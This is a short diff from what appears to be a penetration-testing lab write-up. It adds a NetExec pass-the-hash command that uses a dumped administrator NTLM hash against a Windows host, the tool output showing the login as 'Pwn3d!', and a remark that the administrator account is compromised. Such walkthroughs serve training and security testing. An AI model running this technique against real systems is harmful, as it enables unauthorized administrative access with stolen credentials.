@@ -526,5 +526,10 @@ Now i have dumped all the hashes of all the users
 
 It may be a good idea to grab each of these hashes and put them into a file
 
-```pythg
+```python
+nxc smb EC2AMAZ-NS87CNK.hsm.local -u administrator -H 'd5cad8a9782b2879bf316f56936f1e36' --local-auth 
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [*] Windows 11 / Server 2025 Build 26100 x64 (name:EC2AMAZ-NS87CNK) (domain:EC2AMAZ-NS87CNK) (signing:False) (SMBv1:None)
+SMB         10.0.28.154     445    EC2AMAZ-NS87CNK  [+] EC2AMAZ-NS87CNK\administrator:d5cad8a9782b2879bf316f56936f1e36 (Pwn3d!)
 ```
+The administrator has now been compromised on the windows workstation
+
